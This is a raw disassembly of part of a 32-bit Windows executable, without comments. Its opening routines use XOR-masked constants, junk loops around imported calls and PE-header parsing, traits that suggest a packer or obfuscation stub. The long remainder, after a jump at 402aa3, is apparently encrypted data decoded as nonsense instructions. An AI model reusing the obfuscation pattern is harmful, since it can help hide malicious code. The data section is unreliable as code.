  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	mov    bh,0x2c
  402ab6:	repnz pop ebx
  402ab8:	jl     0x402b36
  402aba:	jl     0x402b38
  402abc:	xor    al,0x5f
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	shl    DWORD PTR [esp+ebp*2+0x6c],1
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi-0x54ecbb0e]
  402b65:	cli    
  402b66:	push   esp
  402b67:	(bad)  
  402b68:	mov    eax,ds:0x2577dd4b
  402b6d:	in     al,dx
  402b6e:	mov    ds:0xefedf81e,al
  402b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b74:	or     al,0x8c
  402b76:	sub    eax,0x53f33f79
  402b7b:	ffreep st(5)
  402b7d:	scas   eax,DWORD PTR es:[edi]
  402b7e:	pusha  
  402b7f:	fisub  DWORD PTR [ebp-0x73]
  402b82:	push   ebx
  402b83:	(bad)  
  402b85:	xchg   ebp,eax
  402b86:	sub    bl,dl
  402b88:	mov    ch,0x6c
  402b8a:	pusha  
  402b8b:	dec    eax
  402b8c:	repnz push esp
  402b8e:	fst    DWORD PTR [edx+edi*2]
  402b91:	(bad)  
  402b92:	fsubp  st(2),st
  402b94:	jno    0x402bc9
  402b96:	and    eax,DWORD PTR [edx+0xcbbe9a7]
  402b9c:	pop    es
  402b9d:	mov    BYTE PTR [edx-0x7fb8dd4b],al
  402ba3:	frstor [ebp+edx*2-0x19]
  402ba7:	shl    BYTE PTR [edi],1
  402ba9:	mov    bh,BYTE PTR [esi-0x58]
  402bac:	sub    DWORD PTR [edi-0x1e],esi
  402baf:	cdq    
  402bb0:	popf   
  402bb1:	aad    0x4
  402bb3:	dec    ecx
  402bb5:	mov    BYTE PTR cs:[ecx],bl
  402bb8:	(bad)  
  402bb9:	inc    ebp
  402bba:	cmp    ebp,DWORD PTR [eax+0x7e]
  402bbd:	int    0x56
  402bbf:	mov    eax,0x84d4e200
  402bc4:	adc    al,BYTE PTR [ecx]
  402bc6:	std    
  402bc7:	cmp    BYTE PTR [ebx-0x12],ah
  402bca:	xchg   DWORD PTR [eax+eax*8-0x50755884],edi
  402bd1:	ja     0x402c4c
  402bd3:	aaa    
  402bd4:	mov    ebx,0x6ae97c63
  402bd9:	mov    ds:0x72c78f7c,eax
  402bde:	xor    ah,0x6b
  402be1:	or     eax,DWORD PTR [edx+0x4bf5269e]
  402be7:	enter  0x453b,0x18
  402beb:	lods   eax,DWORD PTR ds:[esi]
  402bec:	inc    edi
  402bed:	sahf   
  402bee:	mov    BYTE PTR [ecx+0x9a9f403],ah
  402bf4:	xchg   edx,eax
  402bf5:	fcomp  st(3)
  402bf8:	pop    ebx
  402bf9:	cli    
  402bfa:	inc    edx
  402bfb:	imul   esp,DWORD PTR [ebx+0x500bee58],0xffffffa7
  402c02:	and    DWORD PTR [eax+0x2cb3e6b4],0xffffffa1
  402c09:	ja     0x402bdc
  402c0b:	mov    DWORD PTR [edi-0x5d],esi
  402c0e:	xchg   edi,eax
  402c0f:	mov    eax,ds:0xf3dd2c4
  402c14:	mov    ebp,0xd72b7afc
  402c19:	xor    al,0xc3
  402c1b:	inc    ebx
  402c1c:	js     0x402c18
  402c1e:	xor    BYTE PTR [eax-0x1acff9f],al
  402c24:	arpl   WORD PTR [ebx-0x4b],bp
  402c27:	mov    ecx,0x86d995eb
  402c2c:	jne    0x402c54
  402c2e:	mov    cl,0x88
  402c30:	jnp    0x402bf7
  402c32:	repz je 0x402c6b
  402c35:	iret   
  402c36:	test   DWORD PTR [ebp+0x60],ebx
  402c39:	dec    esi
  402c3a:	int    0xca
  402c3c:	das    
  402c3d:	outs   dx,BYTE PTR ds:[esi]
  402c3e:	mov    ah,0x9c
  402c40:	xchg   ebp,eax
  402c41:	ficomp DWORD PTR [edx+eiz*2-0x60]
  402c45:	mov    bh,BYTE PTR [ebp+0xe783fd6]
  402c4b:	xchg   ebx,eax
  402c4c:	mov    ah,0xa0
  402c4e:	xchg   DWORD PTR [edi],esi
  402c50:	adc    al,0xce
  402c52:	sbb    esi,DWORD PTR [ecx+0x49]
  402c55:	mov    DWORD PTR [edx+esi*1],edx
  402c58:	cmc    
  402c59:	sar    DWORD PTR [ebx],1
  402c5b:	jle    0x402c67
  402c5d:	sar    BYTE PTR [edx],cl
  402c5f:	dec    edx
  402c60:	cmp    BYTE PTR [ebx],0x59
  402c63:	ja     0x402c80
  402c65:	push   ds
  402c66:	bound  ebx,QWORD PTR [ecx-0x3b]
  402c69:	inc    eax
  402c6a:	mov    edx,0x71fd5257
  402c6f:	js     0x402cb5
  402c71:	mov    edi,DWORD PTR [esi]
  402c73:	and    BYTE PTR [esi+0x17d8e246],dh
  402c79:	add    BYTE PTR [edi+0x6c342045],0x98
  402c80:	outs   dx,DWORD PTR ds:[esi]
  402c81:	push   esp
  402c82:	jmp    0xbc80:0x6d87c40a
  402c89:	jmp    0x5e83:0x1d85f48f
  402c90:	mov    ds:0x26066ffc,al
  402c95:	add    cl,BYTE PTR [ebx+0x66]
  402c98:	cmp    DWORD PTR [eax-0x4f],ecx
  402c9b:	mov    ss,esi
  402c9d:	ror    bh,1
  402c9f:	stos   BYTE PTR es:[edi],al
  402ca0:	push   ebx
  402ca1:	in     eax,dx
  402ca2:	leave  
  402ca3:	adc    BYTE PTR [ebp-0x57],dh
  402ca6:	pushf  
  402ca7:	je     0x402c79
  402ca9:	shl    BYTE PTR [ecx-0x27],1
  402cac:	jmp    DWORD PTR [ebx]
  402cae:	adc    ebx,DWORD PTR [ebx+0x4e]
  402cb1:	rcl    DWORD PTR [ebx+0xf32da83],cl
  402cb7:	cmp    eax,0xe4399067
  402cbc:	les    ebx,FWORD PTR [edx+0x75690454]
  402cc2:	in     eax,0x12
  402cc4:	jb     0x402cf6
  402cc6:	lds    esp,FWORD PTR [eax-0x4a]
  402cc9:	adc    ch,BYTE PTR [edx-0x44c0b7fe]
  402ccf:	popa   
  402cd0:	push   esp
  402cd1:	push   ds
  402cd2:	sub    DWORD PTR es:[ecx+0x9],ecx
  402cd6:	stc    
  402cd7:	push   0x18
  402cd9:	daa    
  402cda:	mov    esi,0x2807a63b
  402cdf:	rcr    cl,0x89
  402ce2:	fdiv   QWORD PTR [edi-0x29c77407]
  402ce8:	imul   ecx,DWORD PTR [eax+0x2d],0x6cf58ba2
  402cef:	loop   0x402d11
  402cf1:	or     esp,ebx
  402cf3:	xchg   edx,eax
  402cf4:	rcr    BYTE PTR [ebp+0x7474303a],cl
  402cfa:	loop   0x402caa
  402cfc:	cmp    ebp,DWORD PTR [edi]
  402cfe:	cmp    BYTE PTR [ebx+eax*2-0x53],dh
  402d02:	jle    0x402d3e
  402d04:	xor    ecx,eax
  402d06:	and    eax,0xa5859ea0
  402d0b:	sbb    BYTE PTR ds:0x750864e8,ch
  402d11:	(bad)  
  402d12:	retf   0xb73b
  402d15:	mov    ah,0xaf
  402d17:	cli    
  402d18:	fstp   QWORD PTR [esi]
  402d1a:	adc    DWORD PTR [esi-0x2a012b5],0x2009f01c
  402d24:	add    DWORD PTR [eax],edx
  402d26:	xor    BYTE PTR [ebp-0x34],ah
  402d29:	xor    al,0xb4
  402d2b:	jb     0x402cf2
  402d2d:	mov    es,WORD PTR [esi+0x4be0b56a]
  402d33:	mov    DWORD PTR [ebp+0x25],ecx
  402d36:	mov    esp,0x136ab285
  402d3b:	add    edi,DWORD PTR [ecx+0x5d657b6f]
  402d41:	or     DWORD PTR [di-0x2e35],edi
  402d46:	jg     0x402d94
  402d48:	mov    cl,BYTE PTR [eax+esi*8]
  402d4b:	retf   
  402d4c:	add    eax,0xf72607fc
  402d51:	xor    eax,0x33ab4af2
  402d56:	xchg   ebx,eax
  402d57:	retf   0x4016
  402d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d5b:	or     BYTE PTR [eax],cl
  402d5d:	xor    cl,BYTE PTR [ebx+esi*2+0x6815af2d]
  402d64:	lods   al,BYTE PTR ds:[esi]
  402d65:	dec    esi
  402d66:	add    eax,0xefe07bf1
  402d6b:	lock mov ah,0xd7
  402d6e:	imul   DWORD PTR ds:0x3acaaed0
  402d74:	mov    DWORD PTR [ecx+0x76069275],esp
  402d7a:	adc    DWORD PTR ds:0x83fdbb49,0x321b9e7e
  402d84:	mov    eax,0xd57dcba1
  402d89:	call   0xcd45:0x91c53bfb
  402d90:	or     al,0x92
  402d92:	jnp    0x402de5
  402d94:	sbb    DWORD PTR [ecx-0xff41d43],edi
  402d9a:	dec    edi
  402d9b:	xchg   ebp,eax
  402d9c:	push   ss
  402d9d:	retf   
  402d9e:	in     eax,dx
  402d9f:	sbb    eax,0x1aab29d7
  402da4:	push   0x7e
  402da6:	(bad)  
  402da7:	jle    0x402d82
  402da9:	sub    al,0xbb
  402dab:	out    dx,eax
  402dac:	push   ds
  402dad:	icebp  
  402dae:	jb     0x402dc5
  402db0:	pop    ebx
  402db1:	pop    ebp
  402db2:	cmp    bh,dh
  402db4:	dec    edi
  402db5:	and    BYTE PTR [esi],al
  402db7:	and    eax,0x9e6ff667
  402dbc:	fistp  WORD PTR [eax]
  402dbe:	cmp    ah,bh
  402dc0:	ins    DWORD PTR es:[edi],dx
  402dc1:	out    0x58,al
  402dc3:	add    eax,0x65a4f8d1
  402dc8:	adc    ecx,DWORD PTR [esi+0x62]
  402dcb:	jle    0x402db0
  402dcd:	and    DWORD PTR [edx+0x6e],edi
  402dd0:	pop    ss
  402dd1:	aaa    
  402dd2:	sar    DWORD PTR [eax+eiz*4],1
  402dd5:	mov    gs,WORD PTR [esi]
  402dd7:	lock or edi,ebp
  402dda:	jbe    0x402e0c
  402ddc:	(bad)  
  402ddd:	mov    al,ds:0xf36296e0
  402de2:	cs pop ds
  402de4:	bound  edi,QWORD PTR [esi+0x42]
  402de7:	imul   edi,DWORD PTR [ebp-0x3f],0x43
  402deb:	or     al,BYTE PTR gs:[ebx-0x7ee3f4fb]
  402df2:	xchg   ebx,eax
  402df3:	daa    
  402df4:	pop    ebp
  402df5:	mov    eax,ds:0x2d53c241
  402dfa:	add    edi,DWORD PTR [edx-0x79]
  402dfd:	imul   edx
  402dff:	inc    esp
  402e00:	in     al,dx
  402e01:	out    dx,al
  402e02:	push   0xcbfa267f
  402e07:	and    al,0x25
  402e09:	outs   dx,DWORD PTR ds:[esi]
  402e0a:	clc    
  402e0b:	rol    BYTE PTR [edx-0xa4556bf],cl
  402e11:	scas   al,BYTE PTR es:[edi]
  402e12:	mov    WORD PTR [eax],gs
  402e14:	ds aam 0x74
  402e17:	mov    ah,0x8
  402e19:	add    BYTE PTR [ecx+edi*8],0xa8
  402e1d:	xchg   esi,eax
  402e1e:	aad    0x76
  402e20:	test   al,0x6f
  402e22:	clc    
  402e23:	xchg   esi,eax
  402e24:	or     DWORD PTR [edi+0x4f],ecx
  402e27:	stos   BYTE PTR es:[edi],al
  402e28:	sar    eax,1
  402e2a:	pop    edx
  402e2b:	iret   
  402e2c:	rcr    BYTE PTR [ebp-0x12],0xdd
  402e30:	(bad)  [eax+0x4ede4f38]
  402e36:	pop    ecx
  402e37:	jns    0x402ea3
  402e39:	inc    eax
  402e3a:	mov    DWORD PTR [edx+0x31],edx
  402e3d:	cmc    
  402e3e:	push   eax
  402e3f:	mov    ch,0xc5
  402e41:	xor    eax,0x16c56e1c
  402e46:	dec    esi
  402e47:	call   0x9d97:0xfc69f9b2
  402e4e:	jb     0x402e67
  402e50:	daa    
  402e51:	dec    ebp
  402e52:	scas   eax,DWORD PTR es:[edi]
  402e53:	repz mov ch,0xe
  402e56:	push   esi
  402e57:	mov    eax,ds:0x4d728ba8
  402e5c:	mov    eax,ds:0x967a5ede
  402e61:	je     0x402e57
  402e63:	mov    ebp,0xc785c682
  402e68:	lea    eax,[ecx]
  402e6a:	and    esi,DWORD PTR [esi-0x4933edc1]
  402e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e71:	cmp    al,0xd0
  402e73:	xchg   ebp,eax
  402e74:	daa    
  402e75:	push   edx
  402e76:	je     0x402ec0
  402e78:	adc    dh,BYTE PTR [ebx-0x34c46f24]
  402e7e:	in     eax,dx
  402e7f:	test   esi,ebx
  402e81:	fcmovu st,st(7)
  402e83:	in     eax,0x8d
  402e85:	mov    cl,0xd4
  402e87:	sub    bh,BYTE PTR [eax+0xa]
  402e8a:	adc    esp,DWORD PTR [ebp-0x66bdae7d]
  402e90:	or     DWORD PTR [edi-0x65afac82],ecx
  402e96:	int    0xc9
  402e98:	lods   eax,DWORD PTR ds:[esi]
  402e99:	sub    ch,BYTE PTR [ecx+0x2ef9fb31]
  402e9f:	xchg   esp,eax
  402ea0:	daa    
  402ea1:	adc    edi,DWORD PTR [ecx+0x39bb5282]
  402ea7:	fcomp  DWORD PTR [edx-0x1070e0c1]
  402ead:	icebp  
  402eae:	lds    ebp,FWORD PTR [edi+0x78]
  402eb1:	cmp    bh,BYTE PTR ds:0x39fa98af
  402eb7:	mov    ?,ebx
  402eb9:	stos   BYTE PTR es:[edi],al
  402eba:	js     0x402edd
  402ebc:	push   esi
  402ebd:	in     al,dx
  402ebe:	sbb    BYTE PTR [ebx+0x721a1770],bh
  402ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ec5:	mov    al,0x30
  402ec7:	xchg   esi,eax
  402ec8:	test   eax,0xe4ed2c21
  402ecd:	inc    edx
  402ece:	fwait
  402ecf:	(bad)  
  402ed0:	fldcw  WORD PTR [ecx]
  402ed2:	pop    DWORD PTR [edi]
  402ed4:	(bad)  
  402ed6:	popf   
  402ed7:	jl     0x402f3a
  402ed9:	cmp    al,cl
  402edb:	addr16 pop ss
  402edd:	mov    dl,0x2d
  402edf:	ret    0xec43
  402ee2:	push   cs
  402ee3:	neg    cl
  402ee5:	outs   dx,BYTE PTR ds:[esi]
  402ee6:	push   edx
  402ee7:	lods   al,BYTE PTR ds:[esi]
  402ee8:	loopne 0x402ec5
  402eea:	adc    BYTE PTR [eax-0x45],0x29
  402eee:	sar    DWORD PTR [eax-0x7e],cl
  402ef1:	add    esi,DWORD PTR [esi+0x6e]
  402ef4:	sub    ch,ch
  402ef6:	fldenv [eax+0x7e7b1d2c]
  402efc:	jmp    0x72b8:0xbc2ef6b7
  402f03:	lahf   
  402f04:	dec    eax
  402f05:	pop    ebp
  402f06:	xor    eax,0x6053fee5
  402f0b:	cli    
  402f0c:	rol    BYTE PTR [ebx],0xe3
  402f0f:	cdq    
  402f10:	hlt    
  402f11:	jnp    0x402f27
  402f13:	cwde   
  402f14:	div    DWORD PTR [esi]
  402f16:	out    dx,eax
  402f17:	(bad)  
  402f18:	int    0xee
  402f1a:	jno    0x402f27
  402f1c:	(bad)  
  402f1d:	mov    dl,BYTE PTR [ebp+eax*4-0x5fbf63c2]
  402f24:	inc    esi
  402f25:	aaa    
  402f26:	dec    ecx
  402f28:	mov    es,WORD PTR [esi-0x30]
  402f2b:	jae    0x402ed7
  402f2d:	push   ss
  402f2e:	or     eax,0x7d2553d9
  402f33:	retf   
  402f34:	retf   0x9aab
  402f37:	mov    edi,0x5f06e058
  402f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f3d:	repnz stc 
  402f3f:	or     edx,DWORD PTR ds:0x79615ad9
  402f45:	fsubr  QWORD PTR [ecx]
  402f47:	push   ds
  402f48:	push   ebx
  402f49:	or     BYTE PTR [esi],dh
  402f4b:	fst    st(1)
  402f4d:	xor    DWORD PTR [eax],0xfffffffe
  402f50:	dec    esi
  402f51:	sub    DWORD PTR [ebx+edx*8+0x3ea11a17],esi
  402f58:	mov    dh,0x62
  402f5a:	and    eax,0xec0357da
  402f5f:	push   ss
  402f60:	mov    dl,0xb4
  402f62:	xor    al,BYTE PTR [ebx]
  402f64:	mov    bh,0x14
  402f66:	cmp    eax,DWORD PTR [ebp+0x1c5fa0c8]
  402f6c:	scas   al,BYTE PTR es:[edi]
  402f6d:	xor    al,0xd8
  402f6f:	mov    ebx,0x58a863ea
  402f74:	jg     0x402fa8
  402f76:	sbb    esi,DWORD PTR [ebp+ecx*4-0xb1c084a]
  402f7d:	out    0x65,al
  402f7f:	xchg   edi,eax
  402f80:	cmc    
  402f81:	out    dx,al
  402f82:	lods   al,BYTE PTR ds:[esi]
  402f83:	adc    DWORD PTR [eax-0x59f72d62],edi
  402f89:	inc    edx
  402f8a:	mov    bl,0x24
  402f8c:	(bad)  
  402f8d:	rol    dl,0x25
  402f90:	jo     0x402fea
  402f92:	ins    BYTE PTR es:[edi],dx
  402f93:	sbb    DWORD PTR [ebp+0x17384e70],edx
  402f99:	aam    0x46
  402f9b:	popa   
  402f9c:	fst    QWORD PTR [ebx]
  402f9e:	push   0xa2e8c434
  402fa3:	mov    al,0x1
  402fa5:	mov    ecx,DWORD PTR [edx+ecx*4+0x51]
  402fa9:	outs   dx,DWORD PTR ds:[esi]
  402faa:	or     eax,0xfc063960
  402faf:	data16 out dx,al
  402fb1:	es stc 
  402fb3:	xor    bh,cl
  402fb5:	popf   
  402fb6:	ret    0xe3b
  402fb9:	in     al,0x33
  402fbb:	(bad)  
  402fbc:	xchg   esp,eax
  402fbd:	inc    ebx
  402fbe:	outs   dx,BYTE PTR ds:[esi]
  402fbf:	ret    0x8a1f
  402fc2:	fsubr  DWORD PTR ds:0xa2754564
  402fc8:	adc    ebx,DWORD PTR [ecx*4-0x2a4a179e]
  402fcf:	mov    eax,ds:0xe75216d
  402fd4:	test   al,0xf7
  402fd6:	adc    DWORD PTR [ebx],0xffffffb3
  402fd9:	and    al,0x93
  402fdb:	cmp    al,0x5
  402fdd:	clc    
  402fde:	cmp    al,0xc2
  402fe1:	addr16 dec eax
  402fe3:	lods   al,BYTE PTR ds:[esi]
  402fe4:	sub    ax,0x1f30
  402fe8:	cmp    edx,DWORD PTR [edx+esi*2]
  402feb:	pop    esp
  402fec:	lahf   
  402fed:	es mov bh,0x90
  402ff0:	scas   eax,DWORD PTR es:[edi]
  402ff1:	push   edx
  402ff2:	pushf  
  402ff3:	xor    ecx,esp
  402ff5:	sub    ebx,eax
  402ff7:	pop    es
  402ff8:	jmp    0x2add7f08
  402ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ffe:	xchg   edi,eax
  402fff:	push   ss
  403000:	jbe    0x403053
  403002:	xor    al,0xc0
  403004:	data16 jno 0x402fde
  403007:	jecxz  0x402fbc
  403009:	or     BYTE PTR ds:0x93df16ee,ch
  40300f:	mov    WORD PTR [ecx+0xf],ss
  403012:	dec    edi
  403013:	mov    ah,0x35
  403015:	mov    gs,WORD PTR [ecx+eiz*2]
  403018:	push   cs
  403019:	push   edx
  40301a:	jnp    0x403059
  40301c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40301d:	sub    al,0x62
  40301f:	(bad)  
  403021:	push   edi
  403022:	add    eax,0xe054c6a2
  403027:	adc    DWORD PTR [edi+0xe3834c0],eax
  40302d:	mov    al,0x7f
  40302f:	test   al,0xb2
  403031:	jle    0x402fef
  403033:	mov    dl,0x6
  403035:	jge    0x40307d
  403037:	mov    al,0xb4
  403039:	mov    DWORD PTR [ecx],edi
  40303b:	lea    esp,[edi]
  40303d:	dec    ecx
  40303e:	sbb    eax,0x2092a3d8
  403043:	in     eax,dx
  403044:	stc    
  403045:	push   edi
  403046:	push   ecx
  403047:	push   ecx
  403048:	mov    ch,ch
  40304a:	loopne 0x40308f
  40304c:	sbb    dh,cl
  40304e:	fistp  QWORD PTR [edx+0x31f949b7]
  403054:	ret    0xefff
  403057:	hlt    
  403058:	sbb    BYTE PTR [esi+ebp*1],ch
  40305b:	or     DWORD PTR [ecx-0x1a],0x98ec558
  403062:	nop    DWORD PTR [ebx+0x1e567c75]
  403069:	push   edi
  40306a:	enter  0x36a0,0xc1
  40306e:	adc    DWORD PTR ds:0xe45c66dc,ecx
  403074:	loope  0x403089
  403076:	cmp    esi,ebx
  403078:	sub    DWORD PTR ss:[ebx-0x16],esi
  40307c:	dec    ecx
  40307d:	inc    esi
  40307e:	cmp    bl,BYTE PTR [esi]
  403080:	xor    ah,cl
  403082:	mov    bl,0x9
  403084:	idiv   bl
  403086:	sbb    ah,BYTE PTR [ebx]
  403088:	ror    DWORD PTR [edx],1
  40308a:	(bad)  
  40308b:	ja     0x4030ef
  40308d:	dec    edx
  40308e:	and    edx,DWORD PTR [ebx-0x30d001d0]
  403094:	or     DWORD PTR [ecx-0x3bf4d15f],eax
  40309a:	inc    edi
  40309b:	ins    BYTE PTR es:[edi],dx
  40309c:	shl    BYTE PTR [ecx-0x4a],cl
  40309f:	jl     0x40306e
  4030a1:	or     esi,esi
  4030a3:	or     ecx,0x29
  4030a6:	ins    BYTE PTR es:[edi],dx
  4030a7:	pop    ebx
  4030a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030a9:	fst    DWORD PTR [ebx+edx*4]
  4030ac:	jno    0x403077
  4030ae:	cdq    
  4030af:	int    0x36
  4030b1:	add    eax,0x532b719
  4030b6:	add    DWORD PTR [esi+0x50],0x1e2cd7d1
  4030bd:	jge    0x40304b
  4030bf:	add    al,0xad
  4030c1:	and    al,0xdb
  4030c3:	jle    0x40307d
  4030c5:	mov    ah,0x17
  4030c7:	das    
  4030c8:	cld    
  4030c9:	cwde   
  4030ca:	scas   al,BYTE PTR es:[edi]
  4030cb:	adc    eax,0xa9582bc
  4030d0:	adc    eax,0xa9afdec2
  4030d5:	push   ss
  4030d6:	inc    edx
  4030d7:	adc    dl,BYTE PTR [edi+0x79]
  4030da:	xor    ch,BYTE PTR [eax+0x77]
  4030dd:	das    
  4030de:	push   ecx
  4030df:	in     eax,0x21
  4030e1:	sub    edi,DWORD PTR cs:[ebx+0x2c]
  4030e5:	add    cl,BYTE PTR [ecx-0x6e]
  4030e8:	addr16 mov ebp,0x3dcbc09d
  4030ee:	rol    ch,0x8f
  4030f1:	dec    ebp
  4030f2:	iret   
  4030f3:	or     dh,BYTE PTR [bp+0x4ebd]
  4030f8:	inc    esi
  4030f9:	and    al,0xaf
  4030fb:	fld    TBYTE PTR ds:0xab6e
  403100:	jmp    0x7db9:0x44051c41
  403107:	adc    eax,0x41386d6a
  40310c:	jmp    0x40311d
  40310e:	retf   
  40310f:	and    ch,BYTE PTR [ecx-0x3a]
  403112:	int    0xcd
  403114:	cli    
  403115:	fnstcw WORD PTR [esi+edx*8+0x761045ce]
